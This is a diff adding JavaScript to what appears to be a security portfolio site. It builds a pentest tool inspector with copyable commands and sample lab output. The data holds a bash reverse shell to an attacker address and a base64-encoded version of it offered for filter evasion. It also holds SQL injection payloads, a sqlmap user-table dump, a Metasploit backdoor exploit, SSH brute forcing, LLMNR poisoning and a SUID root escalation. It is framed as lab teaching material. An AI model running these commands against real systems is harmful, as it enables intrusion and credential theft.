+      bestUse: 'HTTP/HTTPS proxy interception, Repeater parameter manipulation, Intruder credential testing, and session cookie audits.',
+      commands: [
+        { label: 'Launch Burp Suite', cmd: 'burpsuite &', note: 'Starts proxy service listening on 127.0.0.1:8080' },
+        { label: 'Configure Proxy cURL Test', cmd: 'curl -x http://127.0.0.1:8080 -k http://10.10.10.125/api', note: 'Route command-line traffic through Burp proxy' },
+        { label: 'Inspect Authentication Header', cmd: 'curl -i -H "Authorization: Bearer <TOKEN>" http://10.10.10.125/api/v1/user', note: 'Verify REST API token handling' }
+      ],
+      output: `POST /admin/login.php HTTP/1.1
+Host: 10.10.10.125
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+
+username=admin' OR '1'='1&password=test&login=Submit
+
+HTTP/1.1 302 Found
+Date: Sun, 04 Oct 2026 00:55:12 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Set-Cookie: PHPSESSID=d94k201fa843; path=/; HttpOnly
+Location: /admin/dashboard.php
+Content-Length: 0`,
+      docsUrl: 'handbook/modules/web-security.html',
+      labUrl: 'payloads.html'
+    },
+    sqlmap: {
+      title: 'SQLmap (Automatic SQL Injection)',
+      badge: 'PHASE 02 // SQL INJECTION AUDIT',
+      target: 'TARGET: http://10.10.10.125/profile.php?id=1',
+      desc: 'Audits database input validation on vulnerable GET/POST parameters. Automatically detects DBMS type (MySQL, PostgreSQL, MSSQL), determines injectable parameters, and dumps database schemas in authorized challenge rooms.',
+      bestUse: 'Automated SQLi verification, DBMS fingerprinting, database enumeration, and blind boolean/time-based extraction.',
+      commands: [
+        { label: 'Basic Injection Test & DBMS Fingerprint', cmd: 'sqlmap -u "http://10.10.10.125/profile.php?id=1" --batch', note: 'Run non-interactive automated detection' },
+        { label: 'Enumerate Available Databases', cmd: 'sqlmap -u "http://10.10.10.125/profile.php?id=1" --dbs --batch', note: 'Extract database catalog' },
+        { label: 'Dump Target Table', cmd: 'sqlmap -u "http://10.10.10.125/profile.php?id=1" -D app_db -T users --dump', note: 'Dump user credentials table' }
+      ],
+      output: `[00:55:20] [INFO] testing connection to the target URL
+[00:55:21] [INFO] checking if the target is protected by some kind of WAF/IPS
+[00:55:21] [INFO] testing if the parameter 'id' is dynamic
+[00:55:22] [INFO] parameter 'id' is dynamic
+[00:55:22] [INFO] heuristic (basic) test shows that parameter 'id' might be injectable
+[00:55:23] [INFO] GET parameter 'id' is 'boolean-based blind' injectable
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8821=8821
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-1 UNION ALL SELECT NULL,CONCAT(0x7170707a71,0x546c4f7462,0x7171787071),NULL-- -
+---
+[00:55:24] [INFO] the back-end DBMS is MySQL 5.7
+available databases [2]:
+[*] app_db
+[*] information_schema`,
+      docsUrl: 'handbook/modules/tools-reference.html#tool-sqlmap',
+      labUrl: 'terminal-lab.html?cmd=sqlmap'
+    },
+    curl: {
+      title: 'cURL & Browser DevTools',
+      badge: 'PHASE 02 // DOM & API PROBING',
+      target: 'TARGET: https://10.10.10.125/api/v1/health',
+      desc: 'Fast, lightweight command-line HTTP utility used to test REST endpoints, craft custom headers, replicate browser fetch calls, and verify cookie response behaviors without browser overhead.',
+      bestUse: 'REST API probing, HTTP method tampering (OPTIONS, PUT, DELETE), header manipulation, and automated response parsing.',
+      commands: [
+        { label: 'Inspect Full Headers', cmd: 'curl -i -s -k https://10.10.10.125/api/login', note: 'Include response headers and suppress progress' },
+        { label: 'POST JSON Payload', cmd: 'curl -X POST https://10.10.10.125/api/auth -H "Content-Type: application/json" -d \'{"user":"admin","pass":"secret"}\'', note: 'Send structured JSON data' },
+        { label: 'Follow Redirects & Follow Cookies', cmd: 'curl -L -b cookies.txt -c cookies.txt https://10.10.10.125/dashboard', note: 'Maintain persistent session jar' }
+      ],
+      output: `HTTP/1.1 200 OK
+Date: Sun, 04 Oct 2026 00:55:30 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Type: application/json; charset=UTF-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+{
+  "status": "authenticated",
+  "user": "sec_operator",
+  "role": "auditor",
+  "session_expires_in": 3600,
+  "telemetry": "active"
+}`,
+      docsUrl: 'handbook/modules/web-security.html',
+      labUrl: 'terminal-lab.html?cmd=curl'
+    },
+    metasploit: {
+      title: 'Metasploit Framework (msfconsole)',
+      badge: 'PHASE 03 // EXPLOIT VALIDATION',
+      target: 'TARGET: 10.10.10.125:21 (vsftpd 2.3.4)',
+      desc: 'Industry-standard penetration-testing framework providing thousands of verified modules. We load exploit/unix/ftp/vsftpd_234_backdoor against a vulnerable room, configure RHOSTS, and execute to obtain a root shell session.',
+      bestUse: 'Modular exploit verification, verified CVE exploitation, multi/handler payload listeners, and Meterpreter post-exploitation.',
+      commands: [
+        { label: 'Launch Modular Handler', cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.2; set LPORT 4444; run"', note: 'Start staged reverse listener' },
+        { label: 'Search Modules by CVE', cmd: 'msfconsole -q -x "search cve:2021-41773; exit"', note: 'Query exploit modules for target CVE' },
+        { label: 'Execute Verified Exploit Module', cmd: 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.10.125; run"', note: 'Execute backdoor against target' }
+      ],
+      output: `msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.125
+RHOSTS => 10.10.10.125
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.10.10.125:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.125:21 - USER: 331 Please specify the password.
+[+] 10.10.10.125:21 - Backdoor service spawned on port 6200
+[*] Found shell.
+[*] Command shell session 1 opened (10.10.14.2:44211 -> 10.10.10.125:6200)
+
+id
+uid=0(root) gid=0(root) groups=0(root)`,
+      docsUrl: 'handbook/metasploit.html',
+      labUrl: 'terminal-lab.html?cmd=msfconsole'
+    },
+    searchsploit: {
+      title: 'SearchSploit (Exploit-DB CLI)',
+      badge: 'PHASE 03 // OFFLINE CVE RESEARCH',
+      target: 'DATABASE: Exploit-DB Local Archive (/usr/share/exploitdb)',
+      desc: 'Local command-line search utility for Exploit-DB. Allows lightning-fast offline queries for public exploits, security advisories, and proof-of-concept scripts matching exact service banner strings.',
+      bestUse: 'Offline vulnerability matching, proof-of-concept code inspection, and CVE cross-referencing.',
+      commands: [
+        { label: 'Search Service & Version', cmd: 'searchsploit "Apache 2.4.49" --color', note: 'Query Apache path traversal CVEs' },
+        { label: 'Mirror Exploit File to Current Dir', cmd: 'searchsploit -m 50383', note: 'Copy PoC script 50383.py locally' },
+        { label: 'Search with Web Link URL', cmd: 'searchsploit "OpenSSH 7.2p2" --www', note: 'Display Exploit-DB URL for code' }
+      ],
+      output: `----------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                   |  Path
+----------------------------------------------------------------- ---------------------------------
+Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Executi | multiple/webapps/50383.sh
+Apache HTTP Server 2.4.49/2.4.50 - Path Traversal & RCE (PoC)    | multiple/webapps/50406.py
+----------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results`,
+      docsUrl: 'handbook/searchsploit.html',
+      labUrl: 'terminal-lab.html?cmd=searchsploit'
+    },
+    payloads: {
+      title: 'Payload Hub & Reverse Shells',
+      badge: 'PHASE 03 // SHELLS & EVASION',
+      target: 'ATTACKER LHOST: 10.10.14.2 // LPORT: 4444',
+      desc: 'Comprehensive offensive payload repository offering filter-evasion techniques for command injection (IFS, brace expansion, hex encoding), PHP web shells, LFI wrapper protocols (php://filter), and interactive TTY terminal stabilization.',
+      bestUse: 'Reverse shell generation, remote code execution (RCE) filter evasion, LFI exploitation, and full interactive pseudo-terminal spawning.',
+      commands: [
+        { label: 'Bash TCP Reverse Shell', cmd: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1', note: 'Standard interactive bash reverse TCP stream' },
+        { label: 'Base64 Encoded Bypass', cmd: 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ==" | base64 -d | bash', note: 'Evades space and special character filters' },
+        { label: 'Interactive TTY Upgrade', cmd: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'', note: 'Spawns full PTY terminal session' }
+      ],
+      output: `[+] Connection received from 10.10.10.125:52318
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@target:/var/www/html$ export TERM=xterm
+www-data@target:/var/www/html$ stty rows 38 columns 116
+www-data@target:/var/www/html$ whoami
+www-data
+www-data@target:/var/www/html$ uname -a
+Linux target 5.4.0-104-generic #118-Ubuntu SMP x86_64 GNU/Linux`,
+      docsUrl: 'payloads.html',
+      labUrl: 'payloads.html'
+    },
+    hydra: {
+      title: 'Hydra (Network Logon Cracker)',
+      badge: 'PHASE 04 // NETWORK CREDENTIAL AUDIT',
+      target: 'TARGET: ssh://10.10.10.125:22 (User: admin)',
+      desc: 'Parallelized network login auditor. Tests credentials against challenge targets across SSH, FTP, HTTP POST form, and SMB with thread control to avoid triggering lab connection timeouts.',
+      bestUse: 'Authorized network login auditing, credential stuffing validation, and password policy strength assessment.',
+      commands: [
+        { label: 'SSH Single User Dictionary Audit', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.125 -t 4', note: 'Run 4 parallel threads on SSH port' },
+        { label: 'FTP Multi-User & Password Audit', cmd: 'hydra -L users.txt -P passwords.txt ftp://10.10.10.125 -vV', note: 'Verbose multi-credential test on FTP' },
+        { label: 'HTTP POST Form Login Audit', cmd: 'hydra 10.10.10.125 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=invalid password" -l admin -P rockyou.txt', note: 'Form login test with failure condition' }
+      ],
+      output: `Hydra v9.5 (c) 2023 by van Hauser / THC & David Maciejak - Please do not use in military or secret service organizations!
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.10.125:22/
+[STATUS] 160.00 tries/min, 160 tries in 00:01h, 14344239 to do in 1494:12h, 4 active
+[22][ssh] host: 10.10.10.125   login: admin   password: password123
+[STATUS] Attack finished: 1 target, 1 valid pair found (100% completed)`,
+      docsUrl: 'handbook/modules/tools-reference.html#tool-hydra',
+      labUrl: 'terminal-lab.html?cmd=hydra'
+    },
+    hashcat: {
+      title: 'Hashcat (Advanced Password Recovery)',
+      badge: 'PHASE 04 // GPU HASH RECOVERY',
+      target: 'HASH FILE: hashes.txt (NTLM / MD5 / SHA-256)',
+      desc: 'World\'s fastest GPU-accelerated hash recovery tool. Utilizes the NVIDIA RTX 4070 GPU with rule-based mutations to test billions of candidates per second against cryptographic hashes dumped in lab exercises.',
+      bestUse: 'High-speed GPU hash recovery, rule-based mask attacks, and cryptographic hash verification.',
+      commands: [
+        { label: 'NTLM Dictionary Crack (Mode 1000)', cmd: 'hashcat -m 1000 -a 0 hashes.txt rockyou.txt', note: 'Standard straight dictionary attack on NTLM' },
+        { label: 'Rule-Based Mutation Attack', cmd: 'hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule', note: 'Apply 64 top mutation rules to MD5 hashes' },
+        { label: 'SHA-256 Hash Recovery (Mode 1400)', cmd: 'hashcat -m 1400 hashes.txt rockyou.txt --show', note: 'Display cracked SHA-256 passwords' }
+      ],
+      output: `hashcat (v6.2.6) starting...
+
+CUDA API (CUDA 12.2)
+Device #1: NVIDIA GeForce RTX 4070, 12282/12282 MB
+
+Hashes: 1 digests; 1 unique digests
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+
+b4b9b02e6f09a9bd760f388b67351e2b:hunter2
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Speed.#1.........: 18452.4 MH/s (24.12ms)
+Recovered........: 1/1 (100.00%) Digests`,
+      docsUrl: 'handbook/modules/tools-reference.html#tool-hashcat',
+      labUrl: 'terminal-lab.html?cmd=hashcat'
+    },
+    john: {
+      title: 'John the Ripper (Password Cracker)',
+      badge: 'PHASE 04 // UNIX SHADOW CRACKING',
+      target: 'HASH FILE: /etc/shadow (sha512crypt)',
+      desc: 'Versatile password cracking utility with built-in format auto-detection. Ideal for cracking /etc/shadow password hashes, password-protected SSH keys (ssh2john), and encrypted archive files (zip2john).',
+      bestUse: 'Linux /etc/shadow file cracking, encrypted key/archive format conversion, and single-crack heuristic testing.',
+      commands: [
+        { label: 'Wordlist Attack with Format Detection', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', note: 'Auto-detects hash format and cracks' },
+        { label: 'Crack Linux Shadow File', cmd: 'john --wordlist=rockyou.txt --format=sha512crypt shadow.txt', note: 'Explicit sha512crypt Unix hash cracking' },
+        { label: 'Display Cracked Passwords', cmd: 'john --show hashes.txt', note: 'Print all recovered cleartext credentials' }
+      ],
+      output: `Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+dragon123        (root)     
+1g 0:00:00:02 DONE (2026-10-04 00:55) 0.3846g/s 4820p/s 4820c/s 4820C/s dragon123..dancer
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed`,
+      docsUrl: 'handbook/modules/tools-reference.html#tool-john',
+      labUrl: 'terminal-lab.html?cmd=john'
+    },
+    wireshark: {
+      title: 'Wireshark & Tshark (Packet Analyzer)',
+      badge: 'PHASE 05 // PCAP DISSECTION & TRAFFIC',
+      target: 'PCAP FILE: capture.pcap (Network Stream)',
+      desc: 'Deep packet inspection tool for dissecting network protocols, extracting transmitted files from cleartext streams (HTTP, FTP), analyzing TCP conversation timings, and decoding malicious payload traffic.',
+      bestUse: 'Protocol anomaly detection, TCP stream reassembly, credential extraction from cleartext sessions, and headless PCAP filtering.',
+      commands: [
+        { label: 'Extract Cleartext POST Request Bodies', cmd: 'tshark -r capture.pcap -Y "http.request.method == \'POST\'" -T fields -e http.file_data', note: 'Dump submitted form data from PCAP' },
+        { label: 'Filter DNS Queries', cmd: 'tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name', note: 'Identify outgoing domain resolutions' },
+        { label: 'Capture Live Packets on Interface', cmd: 'tshark -i eth0 -c 100 -w live_capture.pcap', note: 'Capture 100 live packets to file' }
+      ],
+      output: `Running as user "root" and group "root". This could be dangerous.
+1   0.000000 10.10.14.2 → 10.10.10.125 TCP 74 44211 → 80 [SYN] Seq=0
+2   0.024102 10.10.10.125 → 10.10.14.2 TCP 74 80 → 44211 [SYN, ACK] Seq=0 Ack=1
+3   0.024155 10.10.14.2 → 10.10.10.125 TCP 66 44211 → 80 [ACK] Seq=1 Ack=1
+4   0.024310 10.10.14.2 → 10.10.10.125 HTTP 180 GET /admin/config.php HTTP/1.1
+5   0.048210 10.10.10.125 → 10.10.14.2 HTTP 340 HTTP/1.1 200 OK (text/html)
+[Stream reassembled: 1 HTTP conversation found, cleartext credentials identified]`,
+      docsUrl: 'handbook/modules/network-security.html',
+      labUrl: 'terminal-lab.html?cmd=tshark'
+    },
+    responder: {
+      title: 'Responder (LLMNR / NBT-NS Poisoner)',
+      badge: 'PHASE 05 // LOCAL BROADCAST ANALYSIS',
+      target: 'INTERFACE: eth0 (Active Directory Subnet)',
+      desc: 'Simulates local link multicast name resolution (LLMNR) and NetBIOS poisoning in educational Active Directory rooms. Captures NetNTLMv2 authentication challenges when Windows clients attempt to reach nonexistent network shares.',
+      bestUse: 'Active Directory educational lab analysis, observing broadcast protocol fallbacks, and auditing password hash resilience.',
+      commands: [
+        { label: 'Launch Poisoner on Interface', cmd: 'sudo responder -I eth0 -dwv', note: 'Start LLMNR/NBT-NS poisoner with verbose logging' },
+        { label: 'Analyze Captured Hashes', cmd: 'cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt', note: 'View captured NetNTLMv2 challenge hashes' },
+        { label: 'Crack Captured NTLMv2 with Hashcat', cmd: 'hashcat -m 5600 ntlmv2.txt rockyou.txt', note: 'Recover cleartext user credentials' }
+      ],
+      output: `[+] Listening for events...
+[*] [LLMNR]  Poisoned answer sent to 10.10.10.150 for name FILESERVER
+[+] [SMB] NTLMv2-SSP Client   : 10.10.10.150
+[+] [SMB] NTLMv2-SSP Username : TARGETCORP\\Administrator
+[+] [SMB] NTLMv2-SSP Hash     : Administrator::TARGETCORP:42f1a9...:48a2...
+
+[+] Hash written to logs/SMB-NTLMv2-SSP-10.10.10.150.txt`,
+      docsUrl: 'handbook/modules/network-security.html',
+      labUrl: 'handbook/modules/network-security.html'
+    },
+    aircrack: {
+      title: 'Aircrack-ng Suite (Wireless Security)',
+      badge: 'PHASE 05 // 802.11 RADIO FRAMES',
+      target: 'INTERFACE: wlan0mon (Channel 6)',
+      desc: 'Suite of tools for auditing authorized wireless 802.11 networks. Covers placing wireless cards into RFMON monitor mode, capturing beacon and probe request frames, and capturing WPA2 4-way EAPOL handshakes in educational labs.',
+      bestUse: 'Wireless 802.11 packet inspection, monitoring beacon and probe management frames, and WPA2 handshake capture.',
+      commands: [
+        { label: 'Enable Monitor Mode', cmd: 'sudo airmon-ng start wlan0', note: 'Sets card to monitor mode (wlan0mon)' },
+        { label: 'Targeted BSSID Capture', cmd: 'sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w wpa_capture wlan0mon', note: 'Capture packets and 4-way handshake on channel 6' },
+        { label: 'Verify 4-Way Handshake Capture', cmd: 'aircrack-ng wpa_capture-01.cap', note: 'Check capture file for valid EAPOL handshake' }
+      ],
+      output: `CH  6 ][ Elapsed: 1 min ][ 2026-10-04 00:55 ][ WPA handshake: 00:11:22:33:44:55
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER AUTH ESSID
+ 00:11:22:33:44:55  -42 100      482     1240   14   6  130   WPA2 CCMP   PSK  Corp_Lab_Secure
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+ 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  -48   54 -54      0       84  EAPOL  Corp_Lab_Secure`,
+      docsUrl: 'handbook/modules/network-security.html',
+      labUrl: 'handbook/modules/network-security.html'
+    },
+    linux: {
+      title: 'Linux CLI & Privilege Auditing',
+      badge: 'PHASE 06 // SYSTEM AUDITING & SUID',
+      target: 'SYSTEM: Ubuntu / Kali Linux (Kernel 5.4+)',
+      desc: 'Comprehensive Linux security commands for privilege escalation enumeration, file ownership audits, SUID/SGID binary analysis, cron job review, and sudo permissions checking without external dependencies.',
+      bestUse: 'Local privilege escalation discovery, sudo -l audits, SUID binary finding, and Linux system security hardening.',
+      commands: [
+        { label: 'Find SUID Binaries', cmd: 'find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;', note: 'List all binaries executing with root permissions' },
+        { label: 'Check Sudo Privileges', cmd: 'sudo -l', note: 'Check commands allowed without password' },
+        { label: 'Audit Scheduled Cron Jobs', cmd: 'cat /etc/crontab /etc/cron.*/* 2>/dev/null | grep -v "^#"', note: 'Inspect automated jobs for writable scripts' }
+      ],
+      output: `-rwsr-xr-x 1 root root  44784 Jan 12  2024 /usr/bin/newgrp
+-rwsr-xr-x 1 root root  88304 Jan 12  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root  68248 Jan 12  2024 /usr/bin/passwd
+-rwsr-xr-x 1 root root  55560 Feb 21  2024 /usr/bin/chfn
+-rwsr-xr-x 1 root root 182400 Mar 10 14:22 /usr/bin/find  <-- SUID VULNERABILITY!
+
+$ /usr/bin/find . -exec /bin/sh -p \\; -quit
+# whoami
+root`,
+      docsUrl: 'handbook/linux.html',
+      labUrl: 'terminal-lab.html?cmd=sudo'
+    },
+    python: {
+      title: 'Python 3 Security Scripting',
+      badge: 'PHASE 06 // SECURITY AUTOMATION',
+      target: 'RUNTIME: Python 3.10+ / Linux Environment',
+      desc: 'Custom security tooling, rapid socket networking, CVE PoC script modification, and automated HTTP API dispatch. Demonstrates the creation of custom port scanners and vulnerability verification scripts.',
+      bestUse: 'Custom socket scripting, automated reconnaissance dispatch, exploit customization, and report generation.',
+      commands: [
+        { label: 'Raw TCP Banner Grabber', cmd: 'python3 -c "import socket; s=socket.socket(); s.connect((\'10.10.10.125\', 21)); print(s.recv(1024).decode())"', note: 'One-line banner grabbing socket' },
+        { label: 'Subnet Threaded Port Scanner', cmd: 'python3 -c "import socket; [print(f\'Port {p} open\') for p in [22,80,443] if socket.socket().connect_ex((\'10.10.10.125\', p)) == 0]"', note: 'Fast multi-port status check' },
+        { label: 'HTTP Header Security Auditor', cmd: 'python3 -c "import requests; r=requests.get(\'http://10.10.10.125\'); print(r.headers)"', note: 'Audit response security headers' }
+      ],
+      output: `[+] Testing connection to 10.10.10.125...
+[+] Connected to port 21: 220 (vsFTPd 2.3.4)
+[+] Testing HTTP response headers:
+    - Server: Apache/2.4.41 (Ubuntu)
+    - X-Frame-Options: NOT PRESENT (Clickjacking Risk)
+    - X-Content-Type-Options: NOT PRESENT (MIME Sniffing Risk)
+    - Content-Security-Policy: NOT PRESENT
+[+] Audit completed: 3 security headers missing.`,
+      docsUrl: 'handbook/modules/security-automation.html',
+      labUrl: 'terminal-lab.html?cmd=python3'
+    },
+    ollama: {
+      title: 'Ollama & Qwen3-Coder 30B (Private AI)',
+      badge: 'PHASE 06 // LOCAL AI COMPUTE (RTX 4070)',
+      target: 'HARDWARE: Dedicated RTX 4070 (12GB) // 0 Cloud Telemetry',
+      desc: 'Local private LLM inference architecture powering automated vulnerability triage, security code reviews, and autonomous agent orchestration. Operates strictly offline with zero external data telemetry.',
+      bestUse: 'Private vulnerability analysis, security code auditing, CVE remediation generation, and autonomous agent workflows.',
+      commands: [
+        { label: 'Analyze Vulnerability Scan', cmd: 'ollama run qwen2.5-coder:32b "Analyze this CVE and provide mitigation steps: CVE-2021-41773"', note: 'Request contextual vulnerability remediation' },
+        { label: 'Automated Python Code Security Review', cmd: 'ollama run qwen2.5-coder:32b "Review this script for SQL injection vulnerabilities"', note: 'Perform static security code analysis' },
+        { label: 'Inspect Local Models & VRAM', cmd: 'ollama list', note: 'List active quantized models in local memory' }
+      ],
+      output: `>>> Analyzing CVE-2021-41773 (Apache HTTP Server Path Traversal & RCE)
+Assessment:
+- CVSS v3.1: 7.5 (HIGH) / Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+- Flaw: Insufficient path normalization in Apache 2.4.49 allowed path traversal via %2e%2e URI encoding.
+- Impact: Reading arbitrary files outside DocumentRoot; Remote Code Execution if mod_cgi is enabled.
+
+Actionable Mitigation:
+1. Immediately upgrade to Apache HTTP Server 2.4.51 or later.
+2. In httpd.conf, enforce strict root directory access controls:
+   <Directory />
+       Require all denied
+   </Directory>
+3. Disable mod_cgi if dynamic script execution is not required.
+[Analysis completed locally on RTX 4070 in 1.42s · 0 external telemetry]`,
+      docsUrl: 'projects/autonomous-pentesting-agent.html',
+      labUrl: 'projects/cyberai.html'
+    }
+  };
+
+  const hudModal = document.getElementById('tool-inspector-modal');
+  const hudCloseBtn = document.getElementById('hud-close-btn');
+
+  function openToolInspector(toolKey) {
+    const data = TOOL_INSPECTOR_DATA[toolKey];
+    if (!data || !hudModal) return;
+
+    document.getElementById('hud-tool-title').textContent = data.title;
+    document.getElementById('hud-tool-badge').textContent = data.badge;
+    document.getElementById('hud-scenario-target').textContent = data.target;
+    document.getElementById('hud-scenario-desc').textContent = data.desc;
+    document.getElementById('hud-best-use').textContent = data.bestUse;
+    document.getElementById('hud-terminal-output').textContent = data.output;
+    document.getElementById('hud-docs-link').setAttribute('href', data.docsUrl);
+    document.getElementById('hud-lab-link').setAttribute('href', data.labUrl);
+
+    const cmdContainer = document.getElementById('hud-commands-container');
+    cmdContainer.innerHTML = '';
+
+    data.commands.forEach((item) => {
+      const row = document.createElement('div');
+      row.className = 'p-2.5 rounded-lg bg-surface-raised border border-border-hairline space-y-1';
+      row.innerHTML = `
+        <div class="flex items-center justify-between text-[11px]">
+          <span class="text-on-surface font-semibold">${item.label}</span>
+          <span class="text-outline text-[10px] font-sans">${item.note}</span>
+        </div>
+        <div class="flex items-center justify-between p-1.5 rounded bg-canvas-base border border-border-hairline text-primary">
+          <code class="text-[11px] truncate pr-2 select-all">${item.cmd}</code>
+          <button type="button" class="text-outline hover:text-primary transition-colors shrink-0 p-1" title="Copy Command">
+            <span class="material-symbols-outlined text-sm">content_copy</span>
+          </button>
+        </div>
+      `;
+
+      const copyBtn = row.querySelector('button');
+      copyBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        navigator.clipboard.writeText(item.cmd);
+        if (window.showToast) {
+          window.showToast(`Copied: ${item.cmd.substring(0, 30)}...`, 'success');
+        }
+      });
+
+      cmdContainer.appendChild(row);
+    });
+
+    hudModal.classList.remove('hidden');
+    hudModal.classList.add('flex');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeToolInspector() {
+    if (!hudModal) return;
+    hudModal.classList.add('hidden');
+    hudModal.classList.remove('flex');
+    document.body.style.overflow = '';
+  }
+
+  if (hudCloseBtn) {
+    hudCloseBtn.addEventListener('click', closeToolInspector);
+  }
+
+  if (hudModal) {
+    hudModal.addEventListener('click', (e) => {
+      if (e.target === hudModal) {
+        closeToolInspector();
+      }
+    });
+  }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && hudModal && !hudModal.classList.contains('hidden')) {
+      closeToolInspector();
+    }
+  });
+
+  document.addEventListener('click', (e) => {
+    const trigger = e.target.closest('[data-tool-inspector]');
+    if (trigger) {
+      e.preventDefault();
+      const toolKey = trigger.getAttribute('data-tool-inspector');
+      openToolInspector(toolKey);
+    }
+  });
+
+  window.openToolInspector = openToolInspector;
 </script>
 <script src="portfolio-interactive.js"></script>
 </body></html>
